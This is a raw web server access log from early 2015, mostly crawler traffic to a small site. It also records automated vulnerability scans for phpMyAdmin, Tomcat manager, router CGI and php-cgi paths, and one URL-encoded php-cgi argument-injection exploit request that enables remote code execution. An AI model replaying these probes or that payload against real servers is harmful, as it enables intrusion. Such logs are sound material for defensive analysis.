185.56.86.199 - - [27/Jan/2015:14:25:36 -0500] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 - - "-"
185.56.86.199 - - [27/Jan/2015:14:25:40 -0500] "GET //pma/scripts/setup.php HTTP/1.1" 404 - - "-"
66.249.65.161 - - [27/Jan/2015:16:46:18 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [27/Jan/2015:16:46:18 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [27/Jan/2015:19:41:49 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.161 - - [27/Jan/2015:22:37:31 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.169 - - [28/Jan/2015:01:34:49 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
89.69.56.243 - - [28/Jan/2015:02:17:09 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
89.69.56.243 - - [28/Jan/2015:02:17:09 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
2.139.237.110 - - [28/Jan/2015:04:21:20 -0500] "GET /manager/html HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
66.249.65.169 - - [28/Jan/2015:04:31:06 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.225 - - [28/Jan/2015:04:55:49 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.209 - - [28/Jan/2015:04:55:49 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.225 - - [28/Jan/2015:05:05:05 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.209 - - [28/Jan/2015:05:05:06 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.40 - - [28/Jan/2015:07:27:58 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.44 - - [28/Jan/2015:07:27:58 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
89.69.56.243 - - [28/Jan/2015:10:17:52 -0500] "GET /wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36"
66.249.64.44 - - [28/Jan/2015:10:27:15 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
198.211.30.100 - - [28/Jan/2015:12:27:06 -0500] "GET /cgi-bin/test-cgi HTTP/1.1" 404 - - "the beast"
66.249.64.36 - - [28/Jan/2015:13:23:07 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.35.62.11 - - [28/Jan/2015:14:00:04 -0500] "HEAD / HTTP/1.1" 200 - - "-"
66.249.64.36 - - [28/Jan/2015:15:21:12 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
182.118.55.220 - - [28/Jan/2015:16:10:30 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
66.249.64.40 - - [28/Jan/2015:17:21:21 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.40 - - [28/Jan/2015:19:17:10 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
63.131.141.124 - - [28/Jan/2015:22:37:08 -0500] "GET /admin/config.php HTTP/1.0" 404 - - "-"
108.18.186.44 - - [28/Jan/2015:22:41:42 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
188.138.17.205 - - [29/Jan/2015:01:21:02 -0500] "GET / HTTP/1.1" 200 - - "-"
188.138.17.205 - - [29/Jan/2015:01:21:02 -0500] "GET /robots.txt HTTP/1.1" 404 - - "-"
198.154.63.131 - - [29/Jan/2015:02:15:45 -0500] "POST //%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 404 - - "-"
200.30.132.244 - - [29/Jan/2015:03:42:06 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
169.229.3.91 - - [29/Jan/2015:09:35:16 -0500] "Method "\r"  HTTP/1.0" 200 - - "-"
178.210.65.38 - - [29/Jan/2015:14:03:47 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:48 -0500] "HEAD /bitrix/admin/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:50 -0500] "HEAD /bitrix/themes/.default/images/auth_pict.gif HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:51 -0500] "HEAD /bitrix/js/main/core/core.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:53 -0500] "HEAD /bitrix/themes/.default/adminstyles.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:55 -0500] "HEAD /user/login/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:56 -0500] "HEAD /node/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:57 -0500] "HEAD /user/password/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:03:59 -0500] "HEAD /modules/system/system.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:00 -0500] "HEAD /modules/system/system.base.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:01 -0500] "HEAD /media/system/js/mootools.js HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:03 -0500] "HEAD /templates/system/css/system.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:04 -0500] "HEAD /manager/media/style/MODxCarbon/images/misc/logo.png HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:05 -0500] "HEAD /manager/media/style/MODxCarbon/images/misc/login-logo.png HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:07 -0500] "HEAD /manager/media/script/mootools/mootools.js HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:08 -0500] "HEAD /manager/media/style/MODxCarbon/style.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:09 -0500] "HEAD /manager/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:13 -0500] "HEAD /manager/templates/default/images/style/modx-logo-header.png HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:14 -0500] "HEAD /manager/templates/default/images/restyle/headers.jpg HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:16 -0500] "HEAD /manager/templates/default/css/login-min.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:17 -0500] "HEAD /netcat/admin/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:18 -0500] "HEAD /netcat/admin/skins/default/img/logo.png HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:20 -0500] "HEAD /netcat/admin/skins/default/css/style.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:21 -0500] "HEAD /netcat/admin/skins/default/css/login.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:22 -0500] "HEAD /users/forget/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:24 -0500] "HEAD /images/cms/admin/mac/common/butterfly.png HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:25 -0500] "HEAD /installed HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:26 -0500] "HEAD /users/registrate/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:28 -0500] "HEAD /admin/content/sitetree/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:29 -0500] "HEAD /styles/skins/mac/design/css/style.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:30 -0500] "HEAD /wp-admin/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:32 -0500] "HEAD /wp-content/ HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:33 -0500] "HEAD /wp-admin/images/wordpress-logo.png HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:34 -0500] "HEAD /wp-login.php HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
178.210.65.38 - - [29/Jan/2015:14:04:37 -0500] "HEAD /wp-admin/css/wp-admin.css HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Web-Monitoring/1.0; +http://monoid.nic.ru/)"
70.169.188.89 - - [29/Jan/2015:19:55:01 -0500] "GET / HTTP/1.1" 200 - - "-"
70.169.188.89 - - [29/Jan/2015:19:55:01 -0500] "GET //Net_work.xml HTTP/1.1" 404 - - "-"
217.31.48.30 - - [30/Jan/2015:02:02:10 -0500] "HEAD /rom-0 HTTP/1.1" 404 - - "Python-httplib2/0.7.4 (gzip)"
128.208.4.164 - - [30/Jan/2015:03:51:39 -0500] "GET / HTTP/1.0" 200 - - "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
188.138.17.205 - - [30/Jan/2015:03:52:54 -0500] "GET / HTTP/1.1" 200 - - "-"
188.138.17.205 - - [30/Jan/2015:03:53:08 -0500] "GET / HTTP/1.1" 200 - - "-"
66.249.67.121 - - [30/Jan/2015:11:49:45 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [30/Jan/2015:11:49:45 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.129 - - [30/Jan/2015:12:48:45 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
182.118.55.162 - - [30/Jan/2015:13:31:56 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
66.249.67.121 - - [30/Jan/2015:13:48:01 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.200.104.14 - - [30/Jan/2015:15:38:44 -0500] "GET /upgrade.htm HTTP/1.1" 404 - - "libwww-perl/6.04"
61.240.144.67 - - [30/Jan/2015:15:54:20 -0500] "GET / HTTP/1.0" 200 - - "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
66.249.67.129 - - [30/Jan/2015:16:43:31 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [30/Jan/2015:19:41:51 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.220.38.7 - - [30/Jan/2015:20:28:21 -0500] "GET /admin/config.php HTTP/1.0" 404 - - "-"
66.249.67.137 - - [30/Jan/2015:22:38:00 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
98.126.3.75 - - [31/Jan/2015:06:14:18 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
66.249.67.137 - - [31/Jan/2015:10:51:59 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.137 - - [31/Jan/2015:10:51:59 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.137 - - [31/Jan/2015:10:54:53 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [31/Jan/2015:10:54:54 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.148.44.147 - - [31/Jan/2015:10:58:24 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
66.249.67.137 - - [31/Jan/2015:11:49:59 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
107.23.45.196 - - [31/Jan/2015:13:59:51 -0500] "GET / HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
107.23.45.196 - - [31/Jan/2015:13:59:51 -0500] "GET /favicon.ico HTTP/1.1" 200 5108 "http://euterpea.com/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
66.249.67.121 - - [31/Jan/2015:14:47:46 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [31/Jan/2015:17:48:22 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.67.121 - - [31/Jan/2015:20:41:45 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
140.115.17.214 - - [01/Feb/2015:02:15:11 -0500] "GET /cgi-bin/test-cgi HTTP/1.1" 404 - - "the beast"
61.240.144.66 - - [01/Feb/2015:07:55:05 -0500] "GET / HTTP/1.0" 200 - - "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
75.101.177.49 - - [01/Feb/2015:09:57:55 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)"
71.6.167.142 - - [01/Feb/2015:12:57:15 -0500] "GET / HTTP/1.1" 200 - - "-"
71.6.167.142 - - [01/Feb/2015:12:57:15 -0500] "GET /robots.txt HTTP/1.1" 404 - - "-"
66.249.64.89 - - [01/Feb/2015:18:29:19 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.89 - - [01/Feb/2015:18:29:19 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.93 - - [01/Feb/2015:20:25:34 -0500] "GET /new_user HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
122.117.34.89 - - [01/Feb/2015:21:14:26 -0500] "GET /admin/config.php HTTP/1.0" 404 - - "-"
66.249.64.44 - - [02/Feb/2015:03:36:46 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.36 - - [02/Feb/2015:03:36:46 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.36 - - [02/Feb/2015:03:45:05 -0500] "GET /starter-template.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.44 - - [02/Feb/2015:03:45:06 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
188.138.17.205 - - [02/Feb/2015:03:52:23 -0500] "GET / HTTP/1.1" 200 - - "-"
222.186.31.160 - - [02/Feb/2015:05:53:09 -0500] "POST / HTTP/1.1" 200 - - "Mozilla/5.0"
149.129.159.227 - - [02/Feb/2015:07:57:01 -0500] "GET / HTTP/1.1" 200 - - "-"
149.129.159.227 - - [02/Feb/2015:07:57:02 -0500] "GET //Net_work.xml HTTP/1.1" 404 - - "-"
77.37.231.208 - - [02/Feb/2015:08:04:00 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
66.249.64.40 - - [02/Feb/2015:08:46:08 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.43 - - [02/Feb/2015:09:50:41 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.44 - - [02/Feb/2015:09:50:48 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
188.138.17.205 - - [02/Feb/2015:11:23:11 -0500] "GET / HTTP/1.1" 200 - - "-"
188.138.17.205 - - [02/Feb/2015:11:23:11 -0500] "GET /robots.txt HTTP/1.1" 404 - - "-"
157.55.39.43 - - [02/Feb/2015:11:45:40 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
65.55.210.133 - - [02/Feb/2015:11:46:09 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.133 - - [02/Feb/2015:11:46:09 -0500] "GET /starter-template.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.133 - - [02/Feb/2015:11:46:10 -0500] "GET /dist/js/ie-emulation-modes-warning.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.133 - - [02/Feb/2015:11:46:10 -0500] "GET /dist/js/bootstrap.min.js HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
65.55.210.133 - - [02/Feb/2015:11:46:10 -0500] "GET /assets/js/ie10-viewport-bug-workaround.js HTTP/1.1" 404 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
157.55.39.183 - - [02/Feb/2015:11:46:21 -0500] "GET /robots.txt HTTP/1.1" 404 - - "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
88.198.68.113 - - [02/Feb/2015:13:50:00 -0500] "GET / HTTP/1.0" 200 - - "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.4) Gecko/20060516 SeaMonkey/1.0.2"
88.198.68.113 - - [02/Feb/2015:13:50:00 -0500] "GET /new_user HTTP/1.0" 200 - - "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.4) Gecko/20060516 SeaMonkey/1.0.2"
95.211.168.172 - - [02/Feb/2015:13:52:29 -0500] "GET /css/style.css HTTP/1.0" 404 - - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:27.C) Gecko/20130407 Firefox/27.0"
182.118.54.88 - - [02/Feb/2015:16:51:25 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
69.54.147.107 - - [02/Feb/2015:23:49:07 -0500] "GET /tmUnblock.cgi HTTP/1.1" 404 - - "-"
217.92.102.233 - - [03/Feb/2015:02:43:29 -0500] "GET /manager/html HTTP/1.1" 404 - - "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0"
141.212.122.130 - - [03/Feb/2015:07:35:57 -0500] "GET / HTTP/1.1" 200 - - "-"
160.16.121.173 - - [03/Feb/2015:07:53:03 -0500] "GET //cgi-bin/php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:03 -0500] "GET //cgi-bin/php5 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:03 -0500] "GET //cgi-bin/php-cgi HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:04 -0500] "GET //cgi-bin/php.cgi HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:04 -0500] "GET //cgi-bin/php_cgi HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:04 -0500] "GET //cgi-bin/php4 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:05 -0500] "GET //cgi-bin/php3 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:05 -0500] "GET //index.php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:05 -0500] "GET //phppath/php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:06 -0500] "GET //phppath/php5 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:06 -0500] "GET //local-bin/php HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:06 -0500] "GET //local-bin/php5 HTTP/1.1" 404 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
160.16.121.173 - - [03/Feb/2015:07:53:07 -0500] "GET / HTTP/1.1" 200 - - "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
177.0.118.250 - - [03/Feb/2015:11:28:59 -0500] "GET / HTTP/1.1" 200 - "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.0.118.250 - - [03/Feb/2015:11:28:59 -0500] "GET /dist/css/bootstrap.min.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
177.0.118.250 - - [03/Feb/2015:11:29:00 -0500] "GET /starter-template.css HTTP/1.1" 200 - "http://euterpea.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
